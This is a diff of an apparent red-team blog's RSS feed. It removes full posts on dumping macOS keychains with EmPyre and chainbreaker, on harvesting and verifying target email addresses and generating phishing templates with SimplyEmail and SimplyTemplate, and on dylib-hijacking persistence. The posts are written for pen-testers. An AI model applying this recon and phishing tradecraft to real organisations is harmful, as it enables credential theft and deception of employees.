-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_keychain_dump.png&#34; alt=&#34;Empyre Keychain Dump&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-
-&lt;p&gt;Once the keychain is local we can use a python tool called chainbreaker (&lt;a href=&#34;https://github.com/n0fate/chainbreaker&#34;&gt;https://github.com/n0fate/chainbreaker)&lt;/a&gt;). This allows for the use of the password or the master key and will parse and decrypt the entire keychain offline. While this requires the password, a root context is not needed to download the keychain, allowing for offline attempts against the keychain which can be quite useful.&lt;/p&gt;
-
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_keychain_dump2.png&#34; alt=&#34;Empyre Keychain Dump2&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-
-
-&lt;p&gt;Hopefully this has helped clear up different use cases when it comes to EmPyre collection operations and the corresponding modules. As always we plan to release blogs near weekly covering the different use cases of EmPyre, next the team will be covering the injection of Kerberos tickets&lt;/p&gt;
-</description>
+      <guid>http://cybersyndicates.obscuritylabs.com/2016/06/empyre-collection-opperations/</guid>
+      <description>This post is number 4 of the EmPyre series. Thanks to the entire ATD family and dev team of EmPyre:
+@rvrsh3ll — @harmj0y — @xorrior — @CptJesus
+EmPyre can be found here: https://github.com/adaptivethreat/EmPyre
+Master list of the seriers: Here  5/12/16 – Building an EmPyre with Python 5/18/16 – Operating with EmPyre 5/24/16 – The Return Of the EmPyre 5/31/16 – OS X Office Macros with EmPyre  EmPyre: Introduction to collection operations Information gathering may be one of the most vital actions to execute on a target.</description>
     </item>
     
     <item>
       <title>Email Reconnaissance and Phishing Template Generation Made Simple</title>
-      <link>https://cybersyndicates.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/</link>
       <pubDate>Thu, 26 May 2016 21:56:58 +0000</pubDate>
       
-      <guid>https://cybersyndicates.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/</guid>
-      <description>
-
-&lt;p&gt;&lt;strong&gt;Author: Alexander Rymdeko-Harvey, @Killswitch_GUI &lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;First a big thanks to the entire ATD (Adaptive Threat Divsion) team which contributed ideas, support and templates! &lt;a href=&#34;https://www.verisgroup.com/blog/category/adaptive-threat-division/&#34;&gt;https://verisgroup.com/blog/category/adaptive-threat-division/&lt;/a&gt; &lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://twitter.com/cptjesus&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @cptjesus&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
-&lt;a href=&#34;https://twitter.com/sixdub&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @sixdub&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
-&lt;a href=&#34;https://twitter.com/xorrior&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @xorrior&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
-&lt;a href=&#34;https://twitter.com/424f424f&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @424f424f&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
-&lt;a href=&#34;https://twitter.com/enigma0x3&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @enigma0x3&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
-&lt;a href=&#34;https://twitter.com/mattifestation&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @mattifestation&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
-&lt;a href=&#34;https://twitter.com/_wald0&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @_wald0&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
-&lt;a href=&#34;https://twitter.com/bluscreenofjeff&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @bluscreenofjeff&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;&lt;/p&gt;
-
-&lt;h4 id=&#34;email-reconnaissance-and-phishing-template-generation-made-simple&#34;&gt;Email Reconnaissance and Phishing Template Generation Made Simple&lt;/h4&gt;
-
-&lt;p&gt;As a red-teamer or pen-tester, the need for tools that speed up the process is absolutely critical. While tools are not everything, they sure do help when it comes to performing an engagement within a short timeframe that a threat actor would have months to execute. With limited time and the need for effective methodologies, phishing can be a tester’s worst nightmare but also the best path to success. I found that proper reconnaissance and preparation are extremely important when it comes to phishing. I set out to speed up the process while still employing effective methodologies for upcoming and future engagements.&lt;/p&gt;
-
-&lt;p&gt;TL;DR:
-&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/SimplyEmail&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
-&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Email Recon Methodology and name creation:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Over the past few months, I put quite a bit of time into research and current methods that are being used to perform email harvesting. While every tester has a few different methods to get the most out of their recon, most rely upon search indexing and searching for documents. Using this methodology is generally slow and takes up valuable time. One of the major concerns was the ability to cover as much content as possible, with so many documents and locations to search I often missed email data I should have caught.  I knew right away there was room for improvement.&lt;/p&gt;
-
-&lt;p&gt;Using tools like theHarvester has been a great resource for myself and other testers. This tool uses Google and Bing to automatically scrape emails by parsing raw HTML. This tool is used often on engagements and was a huge inspiration to building out a few more features. Here are a few of the sources I knew would be gold mines:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;PasteBin&lt;br /&gt;&lt;/li&gt;
-&lt;li&gt;Past data dumps&lt;/li&gt;
-&lt;li&gt;Raw HTML of target site&lt;/li&gt;
-&lt;li&gt;EmailHunter – &lt;a href=&#34;http://emailhunter.co&#34;&gt;http://emailhunter.co&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I discovered that using HTML parsing over more traditional API searches allows a user to search content that may not yet supply an API. This was the case for a ton of the resources that I wanted to target moving forward with my research. While API based searches have their place, I focused on free and easily accessible data for my gathering techniques. Using advanced Google search operators you can retrieve a list of all .xlsx files currently indexed on Google. Parsing the results was all done manually and finding them took some time.  “Google dorks” that I often employed during my recon phase:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Site:verisgroup.com filetype:doc &amp;ndash; Site: verisgroup.com filetype:docx&lt;/li&gt;
-&lt;li&gt;Site: verisgroup.com filetype:xls &amp;ndash; Site: verisgroup.com filetype:doc&lt;/li&gt;
-&lt;li&gt;Site: verisgroup.com filetype:pdf&lt;/li&gt;
-&lt;li&gt;site:pastebin.com &amp;ldquo;@target.com&amp;rdquo;&lt;/li&gt;
-&lt;li&gt;“@target.com”&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;When searching the web for emails, you have to get creative. An issue I found out early on was the reliability of indexed data, which has to do with indexing and other factors. But I found this out time and time again when it came to searching for new and interesting sources, such as Yahoo, Reddit, Ask, Whois Data, or even PGP keys. These queries may only find 1 or 2 more emails but in the long run, but they add up and you can show your client the visibility they have on the web.&lt;/p&gt;
-
-&lt;p&gt;While email recon can get you a good start or initial vector of attack, covering a larger set of data or targets requires secondary techniques, in particular, inferring email addresses from names. This has been used and talked about pretty thoroughly. One tool that implements this technique is PhishBait (&lt;a href=&#34;https://github.com/pan0pt1c0n/PhishBait&#34;&gt;https://github.com/pan0pt1c0n/PhishBait)&lt;/a&gt;), which scrapes LinkedIn names from Bing to build out a potential email using predictable formats. Will Schroeder (@harmj0y) produced a to scrape names from Connect6 - a sourcing database of employees and their companies. Between these two sites, recent phishing campaigns have seen significantly more success. An example “Google dork” for Connect6:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;site:connect6.com target.com&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;During a standard test it can be useful to attempt to verify the emails gathered. Using the target’s mail server, we can test for SMTP return codes that could potentially support the verify behavior. This simply opens up a connection to the target SMTP server, starts to create a message for an internal recipient and checks for the return codes (250 or 550). By providing the SMTP server a known invalid address, the tester can test if it returns with a 250 code. If this is the case, the server is known as a “catch all”. If anything other than a 250 is returned, we are in luck and can verify the emails gathered and built from name generation!&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;The Birth of SimplyEmail:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;After months of performing the above methodology, consuming roughly a half day of a test time with inaccuracy, I knew there was room within the industry to build a tool that was focused on simplifying the process and improving the accuracy of the information gathered. Many tools built in the security industry have many facets and are generally Swiss army knives in their realm. I knew from the start that SimplyEmail had to do only (simply) email, backed by a framework that would allow other members on the team or industry contribute with ease. Thus, the concept of SimplyEmail was born, and has evolved in accuracy and capability in the email reconnaissance realm.&lt;/p&gt;
-
-&lt;p&gt;Currently, SimplyEmail has 25 modules ranging in capabilities and fidelity. Major sources searched are:&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;HTML scrape of the targets web site&lt;/li&gt;
-&lt;li&gt;PasteBin&lt;/li&gt;
-&lt;li&gt;Exalead search – PDF –XLSX – DOCX –PDF&lt;/li&gt;
-&lt;li&gt;Google Search – PDF XLS/XLSX –DOC/DOCX –PDF&lt;/li&gt;
-&lt;li&gt;PGP keys&lt;/li&gt;
-&lt;li&gt;Instagram&lt;/li&gt;
-&lt;li&gt;Reddit&lt;/li&gt;
-&lt;li&gt;Ask Search&lt;/li&gt;
-&lt;li&gt;Yahoo Search&lt;/li&gt;
-&lt;li&gt;Whois Search&lt;/li&gt;
-&lt;li&gt;GitHub user – Code – Gist&lt;/li&gt;
-&lt;li&gt;Flickr&lt;/li&gt;
-&lt;li&gt;Cannary Bin – API&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;The SimplyEmail framework uses a Task controller and a Producer Consumer model that allows testers to easily write modules, while the framework handles parsing, process creation and formatting. To get started with SimplyEmail you simply:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;    
-  1. git clone &amp;lt;a href=&amp;quot;http://github.com/killswitch-GUI/SimplyEmail.git&amp;quot;&amp;gt;http://github.com/killswitch-GUI/SimplyEmail.git&amp;lt;/a&amp;gt;
-  2. ./sh install.sh(Kali 2 or Debian Currently Supported) 
-  3. ./SimplyEmail –l or ./SimplyEmail –h
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;After the installation of SimplyEmail, it’s time to give it a go:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;  1. ./SimplyEmail –all –e YOURTARGET.com –n –verify
-    –all = Use all modules
-    –e = Your target domain
-    –n = Names generation
-    –Verify = Attempt to verify your discovered emails Address
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/2016/05/pic1.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic1.png&#34; alt=&#34;pic1&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;After the initial email scrape is complete name generation is conducted. Using the built-in LinkedIn Bing scraper, SimplyEmail will start building names using LinkedIn &amp;amp; Connect6:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic2.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic2.png&#34; alt=&#34;pic2&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic3.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic3.png&#34; alt=&#34;pic3&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Next, name generation will be completed. SimplyEmail has two methods to determine the email format. First, it attempts to use EmailHunter’s JSON API to detect the format of the emails. If that fails, SimplyEmail has a built-in class designed to detect the following supported formats:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;{first}.{last} = &lt;a href=&#34;mailto:alex.alex@domain.com&#34;&gt;alex@domain.com&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;{first}{last} = &lt;a href=&#34;mailto:jamesharvey@domain.com&#34;&gt;jamesharvey@domain.com&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;{f}{last} = &lt;a href=&#34;mailto:ajames@domain.com&#34;&gt;ajames@domain.com&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;{f}.{last} = &lt;a href=&#34;mailto:a.james@domain.com&#34;&gt;james@domain.com&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;{first}{l} = &lt;a href=&#34;mailto:jamesh@domain.com&#34;&gt;jamesh@domain.com&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;{first}.{l} = &lt;a href=&#34;mailto:j.amesh@domain.com&#34;&gt;amesh@domain.com&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;{first}_{last} = &lt;a href=&#34;mailto:james_amesh@domain.com&#34;&gt;james_amesh@domain.com&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;{first} = &lt;a href=&#34;mailto:james@domain.com&#34;&gt;james@domain.com&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic4.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic4.png&#34; alt=&#34;pic4&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Lastly, as testers, we all know the importance of reporting and the ability to digest the data we just captured. SimplyEmail has a few great reporting options that are built into the tool. The standard text report and HTML file that will show all non-unique emails with the corresponding sources where SimplyEmail found those emails.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic5.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic5.png&#34; alt=&#34;pic5&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;This generates a clean report on the sources queried and an ordered list of all emails gathered. This also allows for your report to show duplicate email address gathered, which is specifically handy in the case that you need to correlate an email to multiple sources. This helps clients and testers distinguish where trouble areas are and helps make recommendations based on external OSINT presence.  Of course, a standard text file with raw emails is also built.&lt;strong&gt; &lt;a href=&#34;https://cybersyndicates.com/wp-content/pic6.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic6.png&#34; alt=&#34;pic6&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;**Phishing Template Generation is an art: **&lt;/p&gt;
-
-&lt;p&gt;Email template generation often takes a lot of time and effort to get right. This is largely due to ROE restrictions and stipulations put in place by different clients. Some clients say send the best you have, others want to pre-approve the template and even the payload in certain cases. Depending on the client they may even want to pick from a subset of templates. To make sure they have options, testers will generally develop multiple templates with varying degrees of sophistication. This can be a major, but necessary, pain for a tester.&lt;/p&gt;
-
-&lt;p&gt;Current methodology for template generation is pretty standard and is highly variable per target organization type (government vs. civilian, service vs product based etc.). This complicates template generation for the following reasons:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Templates must have relevance to the client&lt;/li&gt;
-&lt;li&gt;Templates must entice the target to act promptly&lt;/li&gt;
-&lt;li&gt;Template payload must be supported by template subject/body&lt;/li&gt;
-&lt;li&gt;Templates must be formatted correctly&lt;/li&gt;
-&lt;li&gt;Templates should have unique text values build the legitimacy of the message body&lt;/li&gt;
-&lt;li&gt;Multiple templates should be generated for failed phishing attempts&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;While this is quite an extensive list, this is merely the bare minimum to be successful at the initial stage of generating the template, let alone template theme or OSINT that is put into making the proper decisions to support the theme. Here is what my current model looks like from an operational prospective:&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;Conduct quick OSINT overview of the company&lt;/li&gt;
-&lt;li&gt;Pick a template theme based on current news or info retrieved from OSINT&lt;/li&gt;
-&lt;li&gt;Conduct research on the correct person/position to emulate in email if necessary&lt;/li&gt;
-&lt;li&gt;Create a message body that supports either a link or attachment based payload&lt;/li&gt;
-&lt;li&gt;Develop HTML by hand for the message body
-
-&lt;ol&gt;
-&lt;li&gt;If necessary, use outlook to build out .EML for rich HTML messages&lt;/li&gt;
-&lt;li&gt;If using an old template, replace/insert necessary data inside of HTML which contains CSS&lt;/li&gt;
-&lt;/ol&gt;&lt;/li&gt;
-&lt;li&gt;Use Cobalt Strike’s spear phish option to view the email&lt;/li&gt;
-&lt;li&gt;Send test phish and make corrections&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;This whole process is extremely time consuming to get correct and changes are often necessary to get the template 100%. If one thing is off it can affect the outcome of statistics as well as payload execution, and in many cases you only get one chance at this. I’ve found that when done correctly it was a solid 4-5 hours from start to finish. This is mainly due to reusing advanced templates and making necessary adjustments as needed. I set out to automate this process as much as possible with SimplyTemplate.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;SimplyTemplate&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;Getting started with SimplyTemplate is extremely easy and can be a great supplement for the above methodology to cut down on template generation time, reduce errors, and generate rich HTML sophisticated emails with ease. This tool aims to automate 80% of the template generation process, with the 20% you perform on your own hopefully resulting in a pull request!  To get started perform the following:
-```&lt;br /&gt;
-  1. git clone &lt;a href=&#34;https://github.com/killswitch-GUI/SimplyTemplate.git&#34;&gt;https://github.com/killswitch-GUI/SimplyTemplate.git&lt;/a&gt;
-  2. ./Setup.sh (Kali 2 or Debian currently supported)
-  3. install the required plugin when prompted into Ice Weasel&lt;br /&gt;
-  4. ./SimplyTemplate.py –l&lt;/p&gt;
-
-&lt;p&gt;To start, it helps to have an understanding of the module types so we can make accurate choices on template selection. All templates will provide you with a small meta tag. This tag will help you quickly identify the capabilities of the module, also what the &amp;ldquo;content&amp;rdquo; supports.&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;High - Requires proper OSINT / Social Engineering to build and effectively deploy the template. These are generally internal based templates with specific themes.&lt;/li&gt;
-&lt;li&gt;Medium - Requires a decent amount of modifications or settings, and are more general of a template external based template.&lt;/li&gt;
-&lt;li&gt;Low - Requires little to no modifications of the template and are generally not effective.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Each template will support one or all of the following core options:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Text - Text based option or output.&lt;br /&gt;&lt;/li&gt;
-&lt;li&gt;Html - Rich Html Supported for output (generally multipart Email Html/Text).&lt;/li&gt;
-&lt;li&gt;Link - Template supports a major link for stats or potential web download of document/Drive-by.&lt;/li&gt;
-&lt;li&gt;Attachment - Can support text that tells users to open or use the supplied attachment.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Seeing how these templates are actually rendered is extremely important. This was an issue I’ve had with the current process for templates with anything other than basic HTML tags. Some phishing platforms have issues with rendering certain formats of email templates. I highly advise using a service like Litmus (&lt;a href=&#34;https://litmus.com&#34;&gt;https://litmus.com)&lt;/a&gt;) or  Mail-Tester (&lt;a href=&#34;https://www.mail-tester.com&#34;&gt;https://www.mail-tester.com)&lt;/a&gt;) to see how the email renders on multiple applications.&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;HTML - This was used by some to view the HTML markup but CSS does not render correctly in some cases. (basic templates)&lt;br /&gt;&lt;/li&gt;
-&lt;li&gt;eml - Files can be outputted via .EML to open them directly in Icedove or Outlook&lt;/li&gt;
-&lt;li&gt;mht - MHTML is the Mail Html Markup used and can directly rendered in Word/IE or Iceweasel via plugin&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Let’s get started with building our first template and rendering these templates.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic7.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic7.png&#34; alt=&#34;pic7&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Currently the templates are broken up by the phishing category they support based on the following:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;External – Templates that would most likely come from external sources
-
-&lt;ul&gt;
-&lt;li&gt;News&lt;/li&gt;
-&lt;li&gt;Agency&lt;/li&gt;
-&lt;li&gt;Storage&lt;/li&gt;
-&lt;li&gt;Social&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;Internal – Templates that would come from internal departments or employees
-
-&lt;ul&gt;
-&lt;li&gt;Marketing&lt;/li&gt;
-&lt;li&gt;IT&lt;/li&gt;
-&lt;li&gt;HR&lt;/li&gt;
-&lt;li&gt;Agency&lt;/li&gt;
-&lt;li&gt;Facilities&lt;/li&gt;
-&lt;li&gt;Leadership&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;As you can see this is easily displayed with the (&lt;em&gt;list)&lt;/em&gt; command within.  We can also use the (&lt;em&gt;search&lt;/em&gt;) command to search for modules by sophistication or core options of the templates.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic8.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic8.png&#34; alt=&#34;pic8&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Execute the (&lt;em&gt;use&lt;/em&gt;) command with the corresponding number and you will be dropped into the relevant template menu. If more information is required, the &lt;em&gt;(info)&lt;/em&gt; command can be used to template variables and a more in-depth explanation.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic9.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic9.png&#34; alt=&#34;pic9&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Once in the template menu you have a few core commands. The first is the &lt;em&gt;(set)&lt;/em&gt; command, which allows you to set specific variables within the template. There are a set of default values that can be used, or you can provide your own. Each template will require a mix of different required values that must be set. You will also observe that higher the sophistication needed, the more OSINT is required and in turn the more settings that will need to be populated. Once all options are set, SimplyTemplate can generate the template on the fly and display the final outcome within a browser. This allows the tester to quickly make changes to settings to ensure the final result will look good on the targets end. Running the &lt;em&gt;(info)&lt;/em&gt; command will show the following changes:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic10.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic10.png&#34; alt=&#34;pic10&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;As mentioned before the (&lt;em&gt;render&lt;/em&gt;) command can be extremely informative to the tester:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic11.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic11.png&#34; alt=&#34;pic11&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Even the more advanced templates render nicely in the. mht format:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic12.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic12.png&#34; alt=&#34;pic12&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Depending on the template and the corresponding sophistication level the (&lt;em&gt;edit)&lt;/em&gt; function may be available. This will eventually be used in a majority of the modules to give testers greater freedom in generating templates. When using this function, you can edit the raw paragraphs of the template before rending or template generation takes place. This is a more advanced feature but allows you to quickly add small changes with out digging through hundred lines of template code to make a spelling or grammar change. This will spawn a custom Text Editor which you can make and save the changes.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic13.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic13.png&#34; alt=&#34;pic13&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Finally use the (&lt;em&gt;gen&lt;/em&gt;) command to quickly export the final product!&lt;/p&gt;
-
-&lt;p&gt;As always I’m looking for improvements or suggestions on both SimplyEmail or SimplyTemplate, every bit helps produce a more useful platform!&lt;/p&gt;
-
-&lt;p&gt;Here are the links:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://github.com/killswitch-GUI/SimplyEmail&#34;&gt;https://github.com/killswitch-GUI/SimplyEmail&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://github.com/killswitch-GUI/SimplyTemplate&#34;&gt;https://github.com/killswitch-GUI/SimplyTemplate&lt;/a&gt;&lt;/p&gt;
-</description>
+      <guid>http://cybersyndicates.obscuritylabs.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/</guid>
+      <description>Author: Alexander Rymdeko-Harvey, @Killswitch_GUI 
+First a big thanks to the entire ATD (Adaptive Threat Divsion) team which contributed ideas, support and templates! https://verisgroup.com/blog/category/adaptive-threat-division/ Follow @cptjesus Follow @sixdub Follow @xorrior Follow @424f424f Follow @enigma0x3 Follow @mattifestation Follow @_wald0 Follow @bluscreenofjeff
+Email Reconnaissance and Phishing Template Generation Made Simple As a red-teamer or pen-tester, the need for tools that speed up the process is absolutely critical. While tools are not everything, they sure do help when it comes to performing an engagement within a short timeframe that a threat actor would have months to execute.</description>
     </item>
     
     <item>
       <title>The Return of the EmPyre</title>
-      <link>https://cybersyndicates.com/2016/05/return-empyre-series-3/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/2016/05/return-empyre-series-3/</link>
       <pubDate>Tue, 24 May 2016 14:34:01 +0000</pubDate>
       
-      <guid>https://cybersyndicates.com/2016/05/return-empyre-series-3/</guid>
-      <description>
-
-&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/empyre_logo_white_background.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/empyre_logo_white_background.png&#34; alt=&#34;empyre_logo_white_background&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;This post is number 3 of the EmPyre series and cross post with a fellow friend and ATD co-worker &lt;a href=&#34;https://twitter.com/xorrior&#34;&gt;@xorrior&lt;/a&gt;. Thanks to the entire ATD family and dev team of EmPyre:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://twitter.com/424f424f&#34;&gt;@rvrsh3ll&lt;/a&gt;  &amp;ndash; &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt; &amp;ndash; &lt;a href=&#34;https://twitter.com/xorrior&#34;&gt;@xorrior&lt;/a&gt; &amp;ndash; &lt;a href=&#34;https://twitter.com/CptJesus&#34;&gt;@CptJesus&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;EmPyre can be found here: &lt;a href=&#34;https://github.com/adaptivethreat/EmPyre&#34;&gt;https://github.com/adaptivethreat/EmPyre&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;5/12/16 – &lt;a href=&#34;http://www.harmj0y.net/blog/?p=2637&amp;amp;preview=true&#34;&gt;&lt;strong&gt;Building an EmPyre with Python&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;5/18/16 – &lt;a href=&#34;http://www.rvrsh3ll.net/blog/empyre/operating-with-empyre/&#34;&gt;&lt;strong&gt;Operating with EmPyre&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;  &lt;/p&gt;
-
-&lt;h2 id=&#34;empyre-persistence&#34;&gt;EmPyre Persistence&lt;/h2&gt;
-
-&lt;p&gt;Mac OS X offers several methods to abuse system functionality and obtain persistence through reboots. One of the most effective methods is &lt;a href=&#34;https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x/&#34;&gt;Dylib Hijacking&lt;/a&gt;. Dylibs are comparable to DLLs in that they contain code executed by applications at runtime. Dylib Hijacking exists because of how “dyld”, the system dynamic linker, searches and loads these libraries. Let’s briefly examine the Mach-O header to understand why this vulnerability exists.&lt;/p&gt;
-
